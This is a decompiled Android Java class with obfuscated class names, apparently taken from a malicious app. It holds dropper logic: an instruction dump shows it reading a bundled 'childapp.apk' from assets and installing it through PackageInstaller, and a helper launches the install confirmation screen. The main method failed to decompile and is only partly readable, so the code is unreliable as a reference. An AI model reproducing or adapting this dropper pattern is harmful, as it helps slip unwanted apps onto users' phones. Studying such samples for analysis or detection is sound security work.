package com.appd.instll;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInstaller;
import android.os.Handler;
import android.os.HandlerThread;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

/* loaded from: classes2.dex */
public class wuiwunabuzhhrmuqncxdphfkapujuw5 {
    private static final String EXTRA_CONFIRMATION_INTENT = "confirmation_intent";
    public static final String EXTRA_SESSION_ID = "session_id";
    private static gkokvbhukfkbujjwqqeflslcirxbjy1 mBroadcastReceiver;
    private static PackageInstaller mPackageInstaller;
    private static Handler mWorkerHandler;
    private static HandlerThread mWorkerThread = new HandlerThread("RootlessSaiPi Worker");

    public static void copyStream(InputStream inputStream, OutputStream outputStream) throws IOException {
        byte[] bArr = new byte[1048576];
        while (true) {
            int read = inputStream.read(bArr);
            if (read <= 0) {
                return;
            } else {
                outputStream.write(bArr, 0, read);
            }
        }
    }

    /* JADX WARN: Not initialized variable reg: 0, insn: 0x00c7: MOVE (r2 I:??[OBJECT, ARRAY]) = (r0 I:??[OBJECT, ARRAY]), block:B:48:0x00c7 */
    /* JADX WARN: Removed duplicated region for block: B:50:0x00ca  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public static void install(android.content.Context r7) {
        /*
            r2 = 0
            android.os.HandlerThread r0 = com.appd.instll.wuiwunabuzhhrmuqncxdphfkapujuw5.mWorkerThread     // Catch: java.lang.Exception -> Lce java.lang.Throwable -> Ld1
            r0.start()     // Catch: java.lang.Exception -> Lce java.lang.Throwable -> Ld1
            android.os.Handler r0 = new android.os.Handler     // Catch: java.lang.Exception -> Lce java.lang.Throwable -> Ld1
            android.os.HandlerThread r1 = com.appd.instll.wuiwunabuzhhrmuqncxdphfkapujuw5.mWorkerThread     // Catch: java.lang.Exception -> Lce java.lang.Throwable -> Ld1
            android.os.Looper r1 = r1.getLooper()     // Catch: java.lang.Exception -> Lce java.lang.Throwable -> Ld1
            r0.<init>(r1)     // Catch: java.lang.Exception -> Lce java.lang.Throwable -> Ld1
            com.appd.instll.wuiwunabuzhhrmuqncxdphfkapujuw5.mWorkerHandler = r0     // Catch: java.lang.Exception -> Lce java.lang.Throwable -> Ld1
            com.appd.instll.gkokvbhukfkbujjwqqeflslcirxbjy1 r0 = new com.appd.instll.gkokvbhukfkbujjwqqeflslcirxbjy1     // Catch: java.lang.Exception -> Lce java.lang.Throwable -> Ld1
            r0.<init>(r7)     // Catch: java.lang.Exception -> Lce java.lang.Throwable -> Ld1
            com.appd.instll.wuiwunabuzhhrmuqncxdphfkapujuw5.mBroadcastReceiver = r0     // Catch: java.lang.Exception -> Lce java.lang.Throwable -> Ld1
            android.content.IntentFilter r1 = new android.content.IntentFilter     // Catch: java.lang.Exception -> Lce java.lang.Throwable -> Ld1
            java.lang.String r3 = "com.appd.instll.load.action.RootlessSaiPiBroadcastReceiver.ACTION_DELIVER_PI_EVENT"
            r1.<init>(r3)     // Catch: java.lang.Exception -> Lce java.lang.Throwable -> Ld1
            r3 = 0
            android.os.Handler r4 = com.appd.instll.wuiwunabuzhhrmuqncxdphfkapujuw5.mWorkerHandler     // Catch: java.lang.Exception -> Lce java.lang.Throwable -> Ld1
            r7.registerReceiver(r0, r1, r3, r4)     // Catch: java.lang.Exception -> Lce java.lang.Throwable -> Ld1
            android.content.pm.PackageManager r0 = r7.getPackageManager()     // Catch: java.lang.Exception -> Lce java.lang.Throwable -> Ld1
            android.content.pm.PackageInstaller r0 = r0.getPackageInstaller()     // Catch: java.lang.Exception -> Lce java.lang.Throwable -> Ld1
            com.appd.instll.wuiwunabuzhhrmuqncxdphfkapujuw5.mPackageInstaller = r0     // Catch: java.lang.Exception -> Lce java.lang.Throwable -> Ld1
            android.content.pm.PackageInstaller$SessionParams r0 = new android.content.pm.PackageInstaller$SessionParams     // Catch: java.lang.Exception -> Lce java.lang.Throwable -> Ld1
            r1 = 1
            r0.<init>(r1)     // Catch: java.lang.Exception -> Lce java.lang.Throwable -> Ld1
            r1 = 0
            r0.setInstallLocation(r1)     // Catch: java.lang.Exception -> Lce java.lang.Throwable -> Ld1
            int r1 = android.os.Build.VERSION.SDK_INT     // Catch: java.lang.Exception -> Lce java.lang.Throwable -> Ld1
            r3 = 26
            if (r1 < r3) goto L45
            r1 = 4
            r0.setInstallReason(r1)     // Catch: java.lang.Exception -> Lce java.lang.Throwable -> Ld1
        L45:
            android.content.pm.PackageInstaller r1 = com.appd.instll.wuiwunabuzhhrmuqncxdphfkapujuw5.mPackageInstaller     // Catch: java.lang.Exception -> Lce java.lang.Throwable -> Ld1
            int r0 = r1.createSession(r0)     // Catch: java.lang.Exception -> Lce java.lang.Throwable -> Ld1
            android.content.pm.PackageInstaller r1 = com.appd.instll.wuiwunabuzhhrmuqncxdphfkapujuw5.mPackageInstaller     // Catch: java.lang.Exception -> Lce java.lang.Throwable -> Ld1
            android.content.pm.PackageInstaller$Session r0 = r1.openSession(r0)     // Catch: java.lang.Exception -> Lce java.lang.Throwable -> Ld1
            android.content.res.AssetManager r1 = r7.getAssets()     // Catch: java.lang.Exception -> Lb0 java.lang.Throwable -> Lc6
            java.lang.String r2 = "childapp.apk"
            java.io.InputStream r6 = r1.open(r2)     // Catch: java.lang.Exception -> Lb0 java.lang.Throwable -> Lc6
            java.lang.String r1 = "%d.apk"
            r2 = 1
            java.lang.Object[] r2 = new java.lang.Object[r2]     // Catch: java.lang.Throwable -> La9
            r3 = 0
            r4 = 0
            java.lang.Integer r4 = java.lang.Integer.valueOf(r4)     // Catch: java.lang.Throwable -> La9
            r2[r3] = r4     // Catch: java.lang.Throwable -> La9
            java.lang.String r1 = java.lang.String.format(r1, r2)     // Catch: java.lang.Throwable -> La9
            r2 = 0
            int r4 = r6.available()     // Catch: java.lang.Throwable -> La9
            long r4 = (long) r4     // Catch: java.lang.Throwable -> La9
            java.io.OutputStream r2 = r0.openWrite(r1, r2, r4)     // Catch: java.lang.Throwable -> La9
            copyStream(r6, r2)     // Catch: java.lang.Throwable -> La2
            r0.fsync(r2)     // Catch: java.lang.Throwable -> La2
            if (r2 == 0) goto L82
            r2.close()     // Catch: java.lang.Throwable -> La9
        L82:
            if (r6 == 0) goto L87
            r6.close()     // Catch: java.lang.Exception -> Lb0 java.lang.Throwable -> Lc6
        L87:
            android.content.Intent r1 = new android.content.Intent     // Catch: java.lang.Exception -> Lb0 java.lang.Throwable -> Lc6
            java.lang.String r2 = "com.appd.instll.load.action.RootlessSaiPiBroadcastReceiver.ACTION_DELIVER_PI_EVENT"
            r1.<init>(r2)     // Catch: java.lang.Exception -> Lb0 java.lang.Throwable -> Lc6
            r2 = 0
            r3 = 134217728(0x8000000, float:3.85186E-34)
            android.app.PendingIntent r1 = android.app.PendingIntent.getBroadcast(r7, r2, r1, r3)     // Catch: java.lang.Exception -> Lb0 java.lang.Throwable -> Lc6
            android.content.IntentSender r1 = r1.getIntentSender()     // Catch: java.lang.Exception -> Lb0 java.lang.Throwable -> Lc6
            r0.commit(r1)     // Catch: java.lang.Exception -> Lb0 java.lang.Throwable -> Lc6
            if (r0 == 0) goto La1
        L9e:
            r0.close()
        La1:
            return
        La2:
            r1 = move-exception
            if (r2 == 0) goto La8
            r2.close()     // Catch: java.lang.Throwable -> Lbc
        La8:
            throw r1     // Catch: java.lang.Throwable -> La9
        La9:
            r1 = move-exception
            if (r6 == 0) goto Laf
            r6.close()     // Catch: java.lang.Throwable -> Lc1
        Laf:
            throw r1     // Catch: java.lang.Exception -> Lb0 java.lang.Throwable -> Lc6
        Lb0:
            r1 = move-exception
        Lb1:
            r1.printStackTrace()     // Catch: java.lang.Throwable -> Lc6
            if (r0 == 0) goto Lb9
            r0.abandon()     // Catch: java.lang.Throwable -> Lc6
        Lb9:
            if (r0 == 0) goto La1
            goto L9e
        Lbc:
            r2 = move-exception
            r1.addSuppressed(r2)     // Catch: java.lang.Throwable -> La9
            goto La8
        Lc1:
            r2 = move-exception
            r1.addSuppressed(r2)     // Catch: java.lang.Exception -> Lb0 java.lang.Throwable -> Lc6
            goto Laf
        Lc6:
            r1 = move-exception
            r2 = r0
        Lc8:
            if (r2 == 0) goto Lcd
            r2.close()
        Lcd:
            throw r1
        Lce:
            r1 = move-exception
            r0 = r2
            goto Lb1
        Ld1:
            r0 = move-exception
            r1 = r0
            goto Lc8
        */
        throw new UnsupportedOperationException("Method not decompiled: com.appd.instll.wuiwunabuzhhrmuqncxdphfkapujuw5.install(android.content.Context):void");
    }

    public static void start(Context context, int i, Intent intent) {
        Intent intent2 = new Intent(context, (Class<?>) ufmbtltquossowqoxfqbwpamerkbaz2.class);
        intent2.putExtra(EXTRA_CONFIRMATION_INTENT, intent);
        intent2.putExtra("session_id", i);
        intent2.addFlags(268435456);
        context.startActivity(intent2);
    }
}
